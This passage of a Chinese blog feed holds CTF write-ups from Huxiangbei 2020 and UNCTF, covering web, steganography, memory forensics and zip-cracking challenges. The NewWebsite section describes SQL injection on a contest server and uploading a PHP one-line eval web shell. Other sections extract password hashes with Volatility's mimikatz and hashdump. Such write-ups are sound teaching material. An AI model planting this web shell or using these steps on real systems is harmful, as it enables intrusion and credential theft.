class="line">UNCTF&#123;cc95bcb8-f09e-4134-82d2-cb4446d5d93f&#125;</span><br></pre></td></tr></table></figure><h3 id="baba-is-you"><a href="#baba-is-you" class="headerlink" title="baba_is_you"></a>baba_is_you</h3><p>010editor 打开文件，发现其尾部有一个链接。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214123625996.abd50ca76fc3fe323cfc90102204b333cc8981fe.png" alt="image-20201115232547446"></p><p>访问链接，在 B 站评论区找到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unctf&#123;let&#39;s_study_pwn&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>湖湘杯 2020</title>
      <link href="/zh-CN/posts/1e5698e5.html"/>
      <url>/zh-CN/posts/1e5698e5.html</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="题目名字不重要反正题挺简单的"><a href="#题目名字不重要反正题挺简单的" class="headerlink" title="题目名字不重要反正题挺简单的"></a>题目名字不重要反正题挺简单的</h3><p>通过 <code>/index.php?file=phpinfo</code> 访问 phpinfo，在其中可以找到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/3beba06d-1a79-46b6-bf80-da6d5deeb927/1613214214985592.3744a87a1ba3ba0a281de25c199fbeb59db70102.png"></p><h3 id="NewWebsite"><a href="#NewWebsite" class="headerlink" title="NewWebsite"></a>NewWebsite</h3><p>随手点击主页文章，可以发现 cid 是数字索引，猜测存在 SQL 注入。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/3beba06d-1a79-46b6-bf80-da6d5deeb927/1613214215141595.bba64c27fd8edd84822967969494ac76fbdf3b5e.png"></p><p>依照一般的注入方式得到帐号密码。<img src="https://butter.lumosary.workers.dev/images/archive/3beba06d-1a79-46b6-bf80-da6d5deeb927/1613214215273570.f2deed160d1da05d7a8ee1ae7a7cd7cdfe5c59a4.png"></p><p><img src="https://butter.lumosary.workers.dev/images/archive/3beba06d-1a79-46b6-bf80-da6d5deeb927/1613214215455135.7a5137eaad2b91f7a83555886e2ddac8c7916281.png"></p><p>在尝试之下找到 <code>/admin</code> 路由然后使用注入得到的帐号 <code>admin</code>，密码 <code>admin</code> 登录上管理面板。一番查找之后可以找到 <code>/admin/?r=manageinfo</code>，发现其页面下有一个文件上传。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/3beba06d-1a79-46b6-bf80-da6d5deeb927/1613214215632764.1b398b0054f7efec592da0e89ac143289ff4a152.png"></p><p>尝试上传一句话木马。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;lemon&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传 phtml，访问对应的文件 <code>http://47.111.104.99:50800/upload/touxiang/99621604249634.phtml</code>，发现上传成功。使用蚁剑连上去，即可得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/3beba06d-1a79-46b6-bf80-da6d5deeb927/1613214215935486.e42ee4ea3ebd315a547bf9e348fe09965ee2c7d7.png"></p><p><img src="https://butter.lumosary.workers.dev/images/archive/3beba06d-1a79-46b6-bf80-da6d5deeb927/1613214216163859.65fae812588c9cb98213699fc05c49976dcd35c3.png"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="颜文字之谜"><a href="#颜文字之谜" class="headerlink" title="颜文字之谜"></a>颜文字之谜</h3><p>用 Wireshark 分析流量包，可以发现 <code>index-demo.html</code> 的响应的 html 中有一段 base64，将整个 <code>Line-based text data</code> 按字节流导出。将 base64 片段摘取出来。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">KO+9oe+9peKIgO+9pSnvvonvvp7ll6hIaX4gCm==</span><br><span class="line">KO+8oF/vvKA7KSjvvKBf77ygOyko77ygX++8oDspCr==                 </span><br><span class="line">KCtfKyk/KOOAgj7vuL88KV/OuCjjgII+77i/PClfzrgK                     </span><br><span class="line">bygq77+j4pa977+jKinjg5bjgpwK                            </span><br><span class="line">77yc77yI77y+77yN77y+77yJ77yeKOKVr+KWveKVsCAp5aW96aaZfn4K              </span><br><span class="line">44O9KOKcv+++n+KWve++nynjg44o77yg77y+77yQ77y+KQp=             </span><br><span class="line">KF5e44Kezqgo77+j4oiA77+jKc6oKuKYhSzCsCo6LuKYhijvv6Pilr3vv6MpLyQ6Ki7CsOKYhSog44CCCp==</span><br><span class="line">flwo4omn4pa94ommKS9+byhe4pa9XilvKMKs4oC/wqwpKCriiafvuLbiiaYpKSjvv6Pilr3vv6MqICnjgp7ilLPilIHilLMo4pWv4oC14pah4oCyKeKVr++4teKUu+KUgeKUuwp=</span><br><span class="line">4pSz4pSB4pSzIOODjigg44KcLeOCnOODjingsqBf4LKgCn==             </span><br><span class="line">4LKgX+CyoCjila/igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKu+9nuKXjyjCrF/CrCApCp==</span><br><span class="line">KOODjuOBuO+/o+OAgSlvKO+/o+KUsO+/oyop44Ke4pWwKOiJueeav+iJuSAp77yI77i2Xu+4tu+8iSgqIO+/o++4v++/oyko77+jzrUoI++/oykK</span><br><span class="line">KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i/zKvMv++/ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAo=</span><br><span class="line">KMKsX8KsIiko77+j77mP77+j77ybKSjila/CsOKWocKw77yJ4pWv77i1IOKUu+KUgeKUu+ODvSjjgpzilr3jgpzjgIAp77yNQzwoLzvil4c7KS9+KOODmO+9pV/vvaUp44OY4pSz4pSB4pSzCu==</span><br><span class="line">4LKgX+CyoCjila/igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKu+9nuKXjyjCrF/CrCApCo==</span><br><span class="line">KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY/ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIMK</span><br><span class="line">4oqZ77mP4oqZ4oil44O9KCrjgII+0JQ8KW/jgpwvKOOEkm/jhJIpL35+KCNfPC0p77yI77ye5Lq677yc77yb77yJCo==</span><br><span class="line">KOODjuOBuO+/o+OAgSlvKO+/o+KUsO+/oyop44Ke4pWwKOiJueeav+iJuSAp77yI77i2Xu+4tu+8iSgqIO+/o++4v++/oyko77+jzrUoI++/oykK</span><br><span class="line">KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i/zKvMv++/ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAq=</span><br><span class="line">KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY/ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCm==</span><br><span class="line">KG/vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+/o+KWve+/oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCs==</span><br><span class="line">KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i/zKvMv++/ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAp=</span><br><span class="line">KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY/ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCr==</span><br><span class="line">KG/vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+/o+KWve+/oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCt==</span><br><span class="line">KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i/zKvMv++/ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAr=</span><br><span class="line">KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY/ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCi==</span><br><span class="line">KG/vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+/o+KWve+/oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCn==</span><br><span class="line">KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i/zKvMv++/ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAo=</span><br><span class="line">KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY/ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCp==</span><br><span class="line">KG/vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+/o+KWve+/oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCq==</span><br><span class="line">KG/vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+/o+KWve+/oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCl==</span><br><span class="line">KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i/zKvMv++/ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAq=</span><br><span class="line">KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY/ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCl==</span><br><span class="line">KG/vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+/o+KWve+/oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCi==</span><br><span class="line">KOKVr+KAteKWoeKAsinila/ngrjlvLnvvIHigKLigKLigKIK              </span><br><span class="line">KOKVr+KAteKWoeKAsinila/ngrjlvLnvvIHigKLigKLigKIK          </span><br><span class="line">KOKVr+KAteKWoeKAsinila/ngrjlvLnvvIHigKLigKLigKIK      </span><br><span class="line">KOKVr+KAteKWoeKAsinila/ngrjlvLnvvIHigKLigKLigKIo4pWv4oC14pah4oCyKeKVr+eCuOW8ue+8geKAouKAouKAoijila/igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKOKVr+KAteKWoeKAsinila/ngrjlvLnvvIHigKLigKLigKIK</span><br><span class="line">ZmxhZ+iiq+aIkeeCuOayoeS6huWTiOWTiOWTiC==</span><br></pre></td></tr></table></figure><p>使用 base64 隐写的脚本可以跑出 <code>key:&quot;lorrie&quot;</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64_diff_value</span>(<span class="params">s1, s2</span>):</span></span><br><span class="line">    base64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(s2)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">abs</span>(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_stego</span>():</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;text.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_lines = f.readlines()</span><br><span class="line">        bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file_lines:</span><br><span class="line">            steg_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            norm_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;base64&#x27;</span>).encode(<span class="string">&#x27;base64&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">            <span class="built_in">print</span> diff</span><br><span class="line">            pads_num = steg_line.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> diff:</span><br><span class="line">                bin_str += <span class="built_in">bin</span>(diff)[<span class="number">2</span>:].zfill(pads_num * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                bin_str += <span class="string">&#x27;0&#x27;</span> * pads_num * <span class="number">2</span></span><br><span class="line">            <span class="built_in">print</span> goflag(bin_str)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">goflag</span>(<span class="params">bin_str</span>):</span></span><br><span class="line">    res_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>):</span><br><span class="line">        res_str += <span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res_str</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solve_stego()</span><br></pre></td></tr></table></figure><p>使用 010editor 打开文件的时候不难发现最后有个可疑的空行，结合解密出的 key 和题目描述，不难想到 snow 隐写。于是在 Kali Linux 下使用 <code>stegsnow -p lorrie export.html export.txt</code> 提取文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/3beba06d-1a79-46b6-bf80-da6d5deeb927/1613214216339753.5ade994e1c355d0c755db6b6217b9fd8ff727732.png"></p><p>使用记事本打开后得到如下内容，将 <code>→_→</code> 替换为 <code>-</code>，将 <code>←_←</code> 替换为 <code>.</code>，空格替换为 <code>/</code> 后得到一段摩斯电码。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;→_→←_←←_←←_←←_← →_→→_→←_←←_←←_← →_→←_←←_←←_← ←_←←_←←_←→_→→_→ ←_←←_←←_←→_→→_→ ←_← ←_←←_←←_←→_→→_→ →_→→_→→_→→_→←_← →_→←_←←_←←_← ←_←←_←←_←←_←←_← ←_←→_→→_→→_→→_→ →_→→_→→_→→_→→_→ ←_←←_←←_←←_←←_← ←_←←_←→_→←_← →_→←_←←_←←_← ←_←←_←←_←←_←→_→ ←_←→_→ ←_←←_←→_→→_→→_→ →_→→_→→_→→_→←_← ←_←←_←←_←←_←←_← ←_←←_←←_←→_→→_→ ←_←→_→ →_→→_→→_→→_→→_→ →_→←_←→_→←_← ←_← →_→→_→←_←←_←←_← →_→→_→→_→→_→←_← →_→←_←→_→←_← ←_←←_←←_←→_→→_→ ←_←←_←←_←→_→→_→ →_→→_→←_←←_←←_← →_→→_→→_→←_←←_←&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;-....&#x2F;--...&#x2F;-...&#x2F;...--&#x2F;...--&#x2F;.&#x2F;...--&#x2F;----.&#x2F;-...&#x2F;.....&#x2F;.----&#x2F;-----&#x2F;.....&#x2F;..-.&#x2F;-...&#x2F;....-&#x2F;.-&#x2F;..---&#x2F;----.&#x2F;.....&#x2F;...--&#x2F;.-&#x2F;-----&#x2F;-.-.&#x2F;.&#x2F;--...&#x2F;----.&#x2F;-.-.&#x2F;...--&#x2F;...--&#x2F;--...&#x2F;---..&#125;</span><br></pre></td></tr></table></figure><p>解码后得到 <code>67B33E39B5105FB4A2953A0CE79C3378</code>，将其转为小写之后得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">67b33e39b5105fb4a2953a0ce79c3378</span><br></pre></td></tr></table></figure><h3 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h3><p>用 volatility 先确定文件的 profile <code>python vol.py -f WIN-BU6IJ7FI9RU-20190927-152050.raw imageinfo</code>。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/3beba06d-1a79-46b6-bf80-da6d5deeb927/1613214216582137.96e9fdff035aaeab1c1d7c6c764cf407b558c7a4.png"></p><p>然后根据题目描述直接尝试读取用户密码 <code>python vol.py -f WIN-BU6IJ7FI9RU-20190927-152050.raw --profile=Win7SP1x86 mimikatz</code>。</p><p>将密码 <code>qwer1234</code> 按照题目描述 sha1 处理之后得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db25f2fc14cd2d2b1e7af307241f548fb03c312a</span><br></pre></td></tr></table></figure><h3 id="虚实之间"><a href="#虚实之间" class="headerlink" title="虚实之间"></a>虚实之间</h3><p>zip文件要密码，用 010editor 查看，以为伪加密，改了 <code>09 00</code> 改成 <code>00 00</code> 结果发现好像不是伪加密，那就是真加密。想着 ARCHPR 可以直接爆破但是不行，字典也不行，最后考虑了一下 zip 压缩包明文攻击。</p><p>将 <code>mingwen-副本.txt</code> 文件压缩，查看压缩算法，发现与原 zip 文件中的 <code>mingwen.txt</code> 中相同，用 AZPR 爆破得到口令，解压得到flag.txt。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">仅需5，跳过去</span><br><span class="line">ffd5e341le25b2dcab15cbb&#125;gc3bc5b&#123;789b51</span><br></pre></td></tr></table></figure><p>这很像我很久之前分析过的虾米音乐 API 里的 location，先排成一个方阵然后再转置即可，这里补全 5 之后直接套用我很久以前写的函数。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Written at 20181215 */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span>&#123;</span><br><span class="line">            Console.WriteLine(Crytography_Decode(<span class="string">&quot;5ffd5e341le25b2dcab15cbb&#125;gc3bc5b&#123;789b51&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">internal</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">Crytography_Decode</span>(<span class="params"><span class="built_in">string</span> s</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">int</span> linage = Convert.ToInt32(Text_GetLeft(s, <span class="number">1</span>));</span><br><span class="line">            s = Text_GetRight(s, s.Length - <span class="number">1</span>);<span class="comment">//第一位作为行数被提取</span></span><br><span class="line">            <span class="built_in">int</span> column = Convert.ToInt32(s.Length / linage) + <span class="number">1</span>;<span class="comment">//求出列数</span></span><br><span class="line">            <span class="built_in">string</span>[,] arrays = <span class="keyword">new</span> <span class="built_in">string</span>[linage, column];</span><br><span class="line">            <span class="built_in">int</span> arrayToBlock = linage - (s.Length % linage);<span class="comment">//求出需要取空的位数</span></span><br><span class="line">            <span class="built_in">int</span> i, j;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; arrayToBlock;)&#123;<span class="comment">//为最后一列的最后几位取空标记</span></span><br><span class="line">                arrays[linage - <span class="number">1</span> - i, column - <span class="number">1</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; linage;)&#123;<span class="comment">//方正排列</span></span><br><span class="line">                arrays[i, j] = Text_GetLeft(s, <span class="number">1</span>);</span><br><span class="line">                s = Text_GetRight(s, s.Length - <span class="number">1</span>);</span><br><span class="line">                j++;</span><br><span class="line">                <span class="keyword">if</span> (j == column || arrays[i, j] == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">                    i++;</span><br><span class="line">                    j = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>; j &lt; column;)&#123;<span class="comment">//顺序输出</span></span><br><span class="line">                s = s + arrays[i, j];</span><br><span class="line">                i++;</span><br><span class="line">                <span class="keyword">if</span> (i == linage || arrays[i, j] == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">                    j++;</span><br><span class="line">                    i = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">internal</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">Text_GetRight</span>(<span class="params"><span class="built_in">string</span> str, <span class="built_in">int</span> length</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (str == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">string</span> text = str.Substring(str.Length - length, length);</span><br><span class="line">            <span class="keyword">return</span> text;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">internal</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">Text_GetLeft</span>(<span class="params"><span class="built_in">string</span> str, <span class="built_in">int</span> length</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (str == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">string</span> text = str.Substring(<span class="number">0</span>, length);</span><br><span class="line">            <span class="keyword">return</span> text;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><img src="https://butter.lumosary.workers.dev/images/archive/3beba06d-1a79-46b6-bf80-da6d5deeb927/1613214216731334.25238bceb7bcbd3307886394012939c3d8c03e77.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">febc7d2138555b9ebccb32b554dbb11c</span><br></pre></td></tr></table></figure><h3 id="隐藏的秘密"><a href="#隐藏的秘密" class="headerlink" title="隐藏的秘密"></a>隐藏的秘密</h3><p>用 volatility 先确定虚拟内存文件的 profile <code>python vol.py -f p.vmem imageinfo</code>，然后使用 <code>filescan</code> 读取其文件列表，可以在其桌面下发现 <code>file.txt</code>。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/3beba06d-1a79-46b6-bf80-da6d5deeb927/1613214216940768.f5e01c25fa27e263426578dfbb9ae04e4aa767a6.png"></p><p><img src="https://butter.lumosary.workers.dev/images/archive/3beba06d-1a79-46b6-bf80-da6d5deeb927/1613214217139432.bb9bd763bfbd48f0d93c06348a0c24efe099aeb9.png"></p><p>然后提取这个文件，使用文本编辑工具打开，可以得到 hint。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/3beba06d-1a79-46b6-bf80-da6d5deeb927/1613214217377360.059a73fa038f21cdc6a140ee3203b46155a18b3b.png"></p><p><img src="https://butter.lumosary.workers.dev/images/archive/3beba06d-1a79-46b6-bf80-da6d5deeb927/1613214217527539.2bcaf22d3b3be81e9da637c9d0a01deee1e4ddde.png"></p><p>然后，使用 <code>registrydump</code> 导出所有注册表文件。<img src="https://butter.lumosary.workers.dev/images/archive/3beba06d-1a79-46b6-bf80-da6d5deeb927/1613214217756682.798074cb7269da8b8faf898719fc9884a31bf478.png"></p><p>使用 Eric R. Zimmerman 的 RegistryExplorer 加载 SAM 相关的注册表文件，找到唯一一个登陆过的账户。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/3beba06d-1a79-46b6-bf80-da6d5deeb927/1613214218070279.3c4d64d03cae67fee90126e020c129c7e3154497.png"></p><p>使用 <code>hivelist</code> 找出注册表，然后使用对应的键值和 <code>hashdump</code> 查出用户密码的 hash 值，筛选出对应的用户，得到 <code>FHREhpe$:70fdb8f853bd427d7584248b8d2c9f9e:f3cf477fc3ea6ec0b3b5887616dd4506:::</code>。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/3beba06d-1a79-46b6-bf80-da6d5deeb927/1613214218353154.c6cde6626217ecc1e10fb1bd7c35c5603c9e1041.png"></p><p><img src="https://butter.lumosary.workers.dev/images/archive/3beba06d-1a79-46b6-bf80-da6d5deeb927/1613214218635685.0fe4762f2b8dc28c6ee94c7a900fb458fbb5bcc9.png" alt="image-20201101233147616"></p><p>将 hash 的后半部分 <code>f3cf477fc3ea6ec0b3b5887616dd4506</code> 放到 cmd5 网站上尝试解密得到 <code>NIAIWOMA</code>。拼接上用户名，得到 <code>FHREhpe$:NIAIWOMA</code>，将其按照 hint MD5 处理之后得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8cf1d5b00c27cb8284bce9ccecb09fb7</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Bitlocker 的另类解锁方式——记 WMI provider 下的 C# 开发</title>
      <link href="/zh-CN/posts/7ba1ed56.html"/>
      <url>/zh-CN/posts/7ba1ed56.html</url>
      
